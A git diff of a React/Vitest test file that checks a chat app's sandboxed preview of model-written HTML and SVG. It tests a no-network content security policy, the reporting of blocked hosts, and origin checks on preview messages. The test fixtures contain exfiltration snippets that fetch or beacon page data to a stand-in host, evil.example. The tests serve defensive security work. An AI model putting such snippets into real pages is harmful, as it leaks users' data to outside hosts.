@@ -1,6 +1,6 @@
-import { fireEvent, render, screen } from '@testing-library/react';
+import { act, fireEvent, render, screen } from '@testing-library/react';
 import { describe, expect, it, vi } from 'vitest';
-import { fileName, formatSize, mimeFor, previewDocument, wholeDocument } from './chat-files';
+import { PREVIEW_POLICY, blockedHost, fileName, formatSize, mimeFor, previewDocument, wholeDocument } from './chat-files';
 import { ChatMarkdown } from './Markdown';
 
 const GAME = `<!DOCTYPE html>
@@ -43,9 +43,44 @@ describe('previewDocument', () => {
   it("puts the storage stand-in before any of the page's scripts", () => {
     const out = previewDocument(GAME, 'html');
     expect(out.indexOf('localStorage')).toBeLessThan(out.indexOf('<canvas'));
-    expect(out.indexOf('localStorage')).toBeGreaterThan(out.indexOf('<head>'));
     expect(out.startsWith('<!DOCTYPE html>')).toBe(true); // stays in standards mode
-    expect(previewDocument('<svg></svg>', 'svg')).toBe('<svg></svg>');
+  });
+
+  // 2026-11 security review, WEB-03: a previewed page could call any host.
+  it('puts a no-network policy before everything the model wrote, html and svg', () => {
+    const hostile =
+      '<script>fetch("https://evil.example/c?d="+document.title)</script><html><head><title>x</title></head></html>';
+    for (const [text, kind] of [
+      [GAME, 'html'],
+      [hostile, 'html'],
+      ['<!-- <head> --><script>new Image().src="https://evil.example"</script>', 'html'],
+      ['<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("https://evil.example")</script></svg>', 'svg'],
+    ] as const) {
+      const out = previewDocument(text, kind);
+      const policy = out.indexOf('http-equiv="Content-Security-Policy"');
+      expect(policy).toBeGreaterThan(-1);
+      // Nothing of the page's comes before the policy.
+      expect(out.indexOf(text)).toBeGreaterThan(policy);
+      expect(out.slice(0, policy)).toBe('<!DOCTYPE html><meta ');
+      expect(out.endsWith(text)).toBe(true);
+    }
+  });
+
+  it('allows what is written into the page and no host at all', () => {
+    expect(PREVIEW_POLICY).toContain("default-src 'none'");
+    expect(PREVIEW_POLICY).toContain("form-action 'none'");
+    expect(PREVIEW_POLICY).toContain("base-uri 'none'");
+    expect(PREVIEW_POLICY).toContain("script-src 'unsafe-inline'");
+    // No scheme or host source that reaches the network, and no wildcard.
+    expect(PREVIEW_POLICY).not.toMatch(/https?:|wss?:|\*|'self'/);
+  });
+
+  it('names the host of a blocked request, and ignores what was not a request', () => {
+    expect(blockedHost('https://cdn.example.com/lib.js?x=1')).toBe('cdn.example.com');
+    expect(blockedHost('wss://evil.example:8443/s')).toBe('evil.example:8443');
+    expect(blockedHost('http://203.0.113.9')).toBe('203.0.113.9');
+    for (const not of ['inline', 'eval', 'data', '', 'javascript:alert(1)', undefined, 42, { a: 1 }])
+      expect(blockedHost(not)).toBe('');
   });
 });
 
@@ -58,7 +93,21 @@ describe('file card', () => {
     const frame = container.querySelector('iframe');
     expect(frame?.getAttribute('sandbox')).toBe('allow-scripts allow-pointer-lock allow-modals');
     expect(frame?.getAttribute('sandbox')).not.toContain('allow-same-origin');
-    expect(frame?.getAttribute('srcdoc')).toContain('<canvas id="c">');
+    // The preview is a page of its own (see PREVIEW_FRAME); it asks for the
+    // document, and gets the page with the no-network policy first.
+    expect(frame?.getAttribute('src')).toBe('/chat/preview-frame');
+    expect(frame?.hasAttribute('srcdoc')).toBe(false);
+    const sent = vi.spyOn(frame!.contentWindow!, 'postMessage').mockImplementation(() => undefined);
+    act(() => {
+      window.dispatchEvent(new MessageEvent('message', { data: { janusPreviewReady: true }, source: window }));
+    });
+    expect(sent).not.toHaveBeenCalled(); // only the preview itself is answered
+    act(() => {
+      window.dispatchEvent(new MessageEvent('message', { data: { janusPreviewReady: true }, source: frame!.contentWindow }));
+    });
+    const doc = (sent.mock.calls[0]?.[0] as { janusPreviewDocument: string }).janusPreviewDocument;
+    expect(doc).toContain('<canvas id="c">');
+    expect(doc.startsWith('<!DOCTYPE html><meta http-equiv="Content-Security-Policy"')).toBe(true);
     fireEvent.click(screen.getByRole('button', { name: 'Code' }));
     expect(container.querySelector('.chat-file .chat-code')).not.toBeNull();
   });
@@ -92,5 +141,40 @@ describe('file card', () => {
     const { container } = render(<ChatMarkdown text={'```python\nprint(1)\n```'} />);
     expect(container.querySelector('.chat-file')).toBeNull();
     expect(screen.getByRole('button', { name: 'Download code.py' })).toBeTruthy();
+  });
+});
+
+describe('preview network access', () => {
+  it('tells the person when the preview tried to reach a host', () => {
+    const { container } = render(<ChatMarkdown text={'```html\n' + GAME + '```'} />);
+    fireEvent.click(screen.getByRole('button', { name: 'Preview' }));
+    const frame = container.querySelector('iframe') as HTMLIFrameElement;
+    expect(container.querySelector('.chat-file-blocked')).toBeNull();
+    const post = (data: unknown, source: unknown) =>
+      act(() => {
+        window.dispatchEvent(new MessageEvent('message', { data, source: source as MessageEventSource }));
+      });
+    // Not from the preview: ignored.
+    post({ janusPreviewBlocked: 'https://spoof.example/x' }, window);
+    expect(container.querySelector('.chat-file-blocked')).toBeNull();
+    post({ janusPreviewBlocked: 'https://cdn.example.com/lib.js' }, frame.contentWindow);
+    post({ janusPreviewBlocked: 'https://cdn.example.com/other.js' }, frame.contentWindow);
+    post({ janusPreviewBlocked: 'inline' }, frame.contentWindow);
+    // A navigation is stopped by the console's own policy and reported here.
+    act(() => {
+      document.dispatchEvent(
+        Object.assign(new Event('securitypolicyviolation'), {
+          effectiveDirective: 'frame-src',
+          blockedURI: 'https://evil.example',
+        }),
+      );
+    });
+    const note = container.querySelector('.chat-file-blocked');
+    expect(note?.textContent).toContain('this preview tried to reach cdn.example.com, evil.example.');
+    expect(note?.textContent).toContain('nothing was sent');
+    // Closing and reopening starts clean.
+    fireEvent.click(screen.getByRole('button', { name: 'Close preview' }));
+    fireEvent.click(screen.getByRole('button', { name: 'Preview' }));
+    expect(container.querySelector('.chat-file-blocked')).toBeNull();
   });
 });
